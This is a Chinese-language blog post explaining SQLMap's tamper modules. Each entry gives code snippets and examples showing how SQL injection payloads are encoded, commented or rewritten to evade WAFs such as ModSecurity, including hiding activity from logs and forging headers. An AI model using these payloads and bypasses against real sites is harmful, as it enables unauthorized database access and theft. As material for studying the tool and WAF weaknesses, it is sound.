title: 基于SQLMap的tamper模块bypass姿态学习
date: '2019-11-29 15:59:15'
updated: '2019-11-29 16:36:40'
tags: [SQL注入, waf绕过]
permalink: /articles/2019/11/29/1575014355308.html
---
![](https://img.hacpai.com/bing/20190228.jpg?imageView2/1/w/960/h/540/interlace/1/q/100) 


众所周知`SQLMAP`是一款强大的SQL注入攻击，这次我们通过`tamper`模块学习一些ByPass姿态。

<!-- more -->

[SQLMap源码地址](https://github.com/sqlmapproject/sqlmap)

# 0x01 使用方式

```
sqlmap.py XXXXX -tamper "模块名
```

# 0x02 各tamper的作用

##  apostrophemask.py

```python
return payload.replace('\'', "%EF%BC%87") if payload else payload
```

将单引号进行`url编码`，绕过过滤单引号的情况，即：

```
1 AND '1'='1 -->  1 AND %EF%BC%871%EF%BC%87=%EF%BC%871
```

##  apostrophenullencode.py

```python
return payload.replace('\'', "%00%27") if payload else payload
```

将单引号进行`Unicode编码`

```
1 AND '1'='1 -->1 AND %00%271%00%27=%00%271
```

## appendnullbyte.py

```python
return "%s%%00" % payload if payload else payload
```

在构造的`payload`后面加一个空字符

```
1 AND 1=1 -->  1 AND 1=1%00
```

<font color="red">仅在Access数据库下</font>，用于在后端绕过弱Web应用程序防火墙。

## base64encode.py

```python
return encodeBase64(payload, binary=False) if payload else payload
```

将`payload`进行`Base64`编码

```
1' AND SLEEP(5)# --> MScgQU5EIFNMRUVQKDUpIw==
```

## between.py

用`between * and`绕过`>`,`=`过滤

```python
    >>> tamper('1 AND A > B--')
    '1 AND A NOT BETWEEN 0 AND B--'
    >>> tamper('1 AND A = B--')
    '1 AND A BETWEEN B AND B--'
    >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')
    '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'
```

## bluecoat.py

用随机的空白字符和`like`分别代替`空格`和`=`。只适用于 `MySQL 5.1, SGOS`版本。

```python
tamper('SELECT id FROM users WHERE id = 1')
    'SELECT%09id FROM%09users WHERE%09id LIKE 1'
```

## **chardoubleencode.py**

将`payload`进行二次URL编码。用于绕过一些弱的Web应用程序防火墙，这些防火墙在通过规则集处理请求之前不会对请求进行双重URL解码。

```python
>>> tamper('SELECT FIELD FROM%20TABLE')
'%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'
```

## **charencode.py**

将`payload`进行一次URL编码。

```python
>>> tamper('SELECT FIELD FROM%20TABLE')
 '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45'
```

## **charunicodeencode.py**

用 unicode 编码 `payload` ，只编码非编码字符。

```python
>>> tamper('SELECT FIELD%20FROM TABLE')
'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'
```

但是需要在`asp`和`asp.net`环境下

## **charunicodeescape.py**

与上面一样，但是没有环境要求。用于绕过JSON上下文中的弱过滤和/或WAF。

```python
>>> tamper('SELECT FIELD FROM TABLE')
'\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
```

## **commalesslimit.py**

将`payload`中的`limit M,N`用`limit N offset M`代替

```python
    >>> tamper('LIMIT 2, 3')
    'LIMIT 3 OFFSET 2'
```

适用于`Mysql`。

## **commalessmid.py**

将`payload`中`MID(A, B, C)`替换为`MID(A FROM B FOR C)`，绕过逗号过滤

```python
    >>> tamper('MID(VERSION(), 1, 1)')
    'MID(VERSION() FROM 1 FOR 1)'
```

适用于`Mysql`。

## **commentbeforeparentheses.py**

```python
    if payload:
        retVal = re.sub(r"\b(\w+)\(", r"\g<1>/**/(", retVal)
```



在某个单词后的第一个括号前面加入 `/**/ `，用于过滤了函数的情况。

```python
    >>> tamper('SELECT ABS(1)')
    'SELECT ABS/**/(1)'
```

## **concat2concatws.py**

```python
payload = payload.replace("CONCAT(", "CONCAT_WS(MID(CHAR(0),0,0),")
```

将`CONCAT`用`CONCAT_WS`代替，绕过过滤`CONCAT`函数的情况。

```python
    >>> tamper('CONCAT(1,2)')
    'CONCAT_WS(MID(CHAR(0),0,0),1,2)'
```

适用于`MySql`。

## **equaltolike.py**

```python
retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
```

将`=`替换为`LIKE`,绕过等号过滤。

```python
    >>> tamper('SELECT * FROM users WHERE id=1')
    'SELECT * FROM users WHERE id LIKE 1'
```

## **escapequotes.py**

```python
return payload.replace("'", "\\'").replace('"', '\\"')
```

将`'`转换成`\'`,`"`转换成`\"`，绕过单双引号过滤。

```python
    >>> tamper('1" AND SLEEP(5)#')
    '1\\\\" AND SLEEP(5)#'
```

## **greatest.py**

将`>`用`GREATEST`代替，绕过等号过滤。

```python
    >>> tamper('1 AND A > B')
    '1 AND GREATEST(A,B+1)=A'
```

## **halfversionedmorekeywords.py**

在关键字前加`/*!0`注释，绕过关键字过滤。

```python
>>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
```

适用`MySQL < 5.1`

##  **hex2char.py**

用等效的`CONCAT(CHAR(), ...)`代替每个`0x<hex>`编码的字符串。

```python
    >>> tamper('SELECT 0xdeadbeef')
    'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))'
```

适用于`MySQL 4， 5.0 and 5.5`。

## **htmlencode.py**

```
return re.sub(r"[^\w]", lambda match: "&#%d;" % ord(match.group(0)), payload) if payload else payload
```

将`payload`中非字母和数字的字符进行`html编码`。

```python
   >>> tamper("1' AND SLEEP(5)#")
    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'
```

## **ifnull2casewhenisnull.py**

将`IFNULL(A, B)`用`CASE WHEN ISNULL(A) THEN (B) ELSE (A) END`替换，绕过`IFNULL`函数过滤。

```python
    >>> tamper('IFNULL(1, 2)')
    'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END'
```

## **ifnull2ifisnull.py**

将`IFNULL(A, B)`替换为`IF(ISNULL(A), B, A)`，绕过`IFNULL`函数过滤。

```python
    >>> tamper('IFNULL(1, 2)')
    'IF(ISNULL(1),2,1)'
```

## **informationschemacomment.py**

```python
retVal = re.sub(r"(?i)(information_schema)\.", r"\g<1>/**/.", payload)
```

在所有出现的（MySQL）`information_schema`标识符的末尾添加内联注释`/ ** /`，绕过对`information_schema`过滤。

```python
    >>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')
    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'
```

## **least.py**

将`>`替换为`LEAST`，绕过对`>`的过滤。

```python
    >>> tamper('1 AND A > B')
    '1 AND LEAST(A,B+1)=B+1'
```

## lowercase.py

全部替换为小写值，即将`payload`当中的大写转为小写。

```python
    >>> tamper('INSERT')
    'insert'
```

## **luanginx.py**

用于绕过`Lua nginx WAF`,`Lua nginx WAF`不支持处理超过`100`个参数。

```python
>>> random.seed(0); hints={}; payload = tamper("1 AND 2>1", hints=hints); "%s&%s" % (hints[HINT.PREPEND], payload)
'34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1'
```

## **modsecurityversioned.py**

添加完整的查询版本的注释`/*!3+random()+*/`，用注释来包围完整的查询语句，用于绕过ModSecurity 开源WAF

```python
    >>> tamper('1 AND 2>1--')
    '1 /*!30963AND 2>1*/--'
```

适用于`MySQL`。

## **modsecurityzeroversioned.py**

与上面类似，用零版本注释`/*!00000`包围查询语句，绕过waf。

```python
    >>> tamper('1 AND 2>1--')
    '1 /*!00000AND 2>1*/--'
```

适用于`MySQL`。

## **multiplespaces.py**

在关键字周围添加多个空格`' '`。

```python
    >>> tamper('1 UNION SELECT foobar')
    '1     UNION     SELECT     foobar'
```

## **overlongutf8.py**

将`payload`中<font color="red">非字母、数字</font>的字符转换为过长的UTF-8`编码。

```python
    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
    'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1'
```

具体可以参考：[Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)、[0xC0 0x8A与0xE0 0x80 0x8A有什么共同之处](https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/)、[维基百科 UTF-8](https://zh.wikipedia.org/wiki/UTF-8)。

## **overlongutf8more.py**

将`payload`中所有的字符转换为过长的`UTF-8`编码。

```python
 >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
'%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1'
```

## **percentage.py**

用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号.

```python
    >>> tamper('SELECT FIELD FROM TABLE')
    '%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'
```

需要`ASP`环境。

## **plus2concat.py**

用 `concat `函数来替代`+`，用于`+`被过滤的情况。

```python
   >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'
```

适用于`Microsoft SQL Server 2012+`

## **plus2fnconcat.py**

用 `fn concat` 来替代`+`，和上面类似

```python
    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
    'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'
```

适用于`Microsoft SQL Server 2008+`。

## **randomcase.py**

将 `payload` 随机大小写，可用于大小写绕过的情况.

```python
    >>> tamper('SELECT id FROM `user`')
    'SeLeCt id FrOm `user`'
```

## **randomcomments.py**

在 `payload` 的关键字中间随机插入 注释`/**/` ，可用于绕过关键字过滤。

```python
    >>> tamper('INSERT')
    'I/**/NS/**/ERT'
```

## **sp_password.py**

将（MsSQL）函数`sp_password`附加到`payload`的末尾，以便从DBMS日志中自动进行模糊处理。

```python
    >>> tamper('1 AND 9227=9227-- ')
    '1 AND 9227=9227-- sp_password'
```

## **space2comment.py**

用` /**/` 替代`空格`，用于过滤`空格`的绕过。

```python
    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
```

## space2dash.py

用注释符`--`和一个随机字符串加一个换行符替换`空格`。

```python
    >>> tamper('1 AND 9227=9227')
    '1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227'
```

适用于`MSSQL`、`SQLite`。

## **space2hash.py**

和上面类似，不过这儿是用`#`注释符。

```python
    >>> tamper('1 AND 9227=9227')
    '1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227'
```

适用于`MySQL`。

## **space2morecomment.py**

用`/**_**/`代替`空格`。

```python
    >>> tamper('SELECT id FROM users')
    'SELECT/**_**/id/**_**/FROM/**_**/users'
```

适用于`MySQL`。

## **space2morehash.py**

用两个`#`+随机字符串+`\n`的组合来绕过`空格`过滤。

```python
    >>> tamper('1 AND 9227=9227')
    '1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227'
```

适用于`MySQL >= 5.1.13`。

## **space2mssqlblank.py**

```python
blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
```

使用`blanks`中的空白字符来代替`空格`。

```python
    >>> tamper('SELECT id FROM users')
    'SELECT%0Did%0DFROM%04users'
```

适用于`Microsoft SQL Server`。

## **space2mssqlhash.py**

用`#`+`\n`替换`空格`。

```python
    >>> tamper('1 AND 9227=9227')
    '1%23%0AAND%23%0A9227=9227'
```

适用于`MySQL`、`MSSQL`。

## **space2mysqlblank.py**

```python
 blanks = ('%09', '%0A', '%0C', '%0D', '%0B', '%A0')
```

使用`blanks`中的空白字符来代替`空格`。

```python
    >>> tamper('SELECT id FROM users')
    'SELECT%A0id%0CFROM%0Dusers'
```

适用于`MySQL`。

## **space2mysqldash.py**

用`--`+`\n`替换`空格`。

```python
    >>> tamper('1 AND 9227=9227')
    '1--%0AAND--%0A9227=9227'
```

适用于`MySQL`、`MSSQL`。

## **space2plus.py**

用`+ `替换`空格`。

```python
    >>> tamper('SELECT id FROM users')
    'SELECT+id+FROM+users'
```

## **space2randomblank.py**

```python
blanks = ("%09", "%0A", "%0C", "%0D")
```

使用`blanks`中的空白字符来代替`空格`。

```python
    >>> tamper('SELECT id FROM users')
    'SELECT%0Did%0CFROM%0Ausers'
```

## **substring2leftright.py**

使用`LEFT`，`RIGHT`函数替换`SUBSTRING`函数，绕过`SUBSTRING`函数过滤。

```python
    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')
    'LEFT((SELECT usename FROM pg_user)::text,1)'
    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')
    'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)'
```

适用于` PostgreSQL`。

## **symboliclogical.py**

```python
 retVal = re.sub(r"(?i)\bAND\b", "%26%26", re.sub(r"(?i)\bOR\b", "%7C%7C", payload))
```

用`&&`和`||`替换`AND`和`OR`。

```python
    >>> tamper("1 AND '1'='1")
    "1 %26%26 '1'='1"
```

## **unionalltounion.py**

```
payload.replace("UNION ALL SELECT", "UNION SELECT") if payload else payload
```

用 `union select` 替换`union all select`。

```python
    >>> tamper('-1 UNION ALL SELECT')
    '-1 UNION SELECT'
```

## **unmagicquotes.py**

用宽字符`%BF%27 `代替`'`以及通用注释符，绕过`magic_quotes/addslashes`函数。

```python
    >>> tamper("1' AND 1=1")
    '1%bf%27-- -'
```

参考：[浅析白盒审计中的字符编码及SQL注入](https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html)。

## **uppercase.py**

将`payload`转换为大写。

```python
    >>> tamper('insert')
    'INSERT'
```

## **varnish.py**

添加一个 HTTP 头 ` X-originating-IP ` 来绕过 WAF。

```python
    headers = kwargs.get("headers", {})
    headers["X-originating-IP"] = "127.0.0.1"
```

参考：[使用HTTP标头绕过Web应用程序防火墙](https://web.archive.org/web/20160815052159/http://community.hpe.com/t5/Protect-Your-Assets/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366)

## **versionedkeywords.py**

对不是函数的关键字进行注释。

```python
 >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'
```

适用于`MySQL`。

## **versionedmorekeywords.py**

注释每个关键字。

```python
>>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
```

适用于`MySQL >= 5.1.13`。

## xforwardedfor.py

```python
    headers = kwargs.get("headers", {})
    headers["X-Forwarded-For"] = randomIP()
    headers["X-Client-Ip"] = randomIP()
    headers["X-Real-Ip"] = randomIP()
```

添加一个伪造的 HTTP 头 `X-Forwarded-For ` 来绕过 WAF。



参考文献：

[sqlmap的tamper详解](https://cloud.tencent.com/developer/article/1197361)
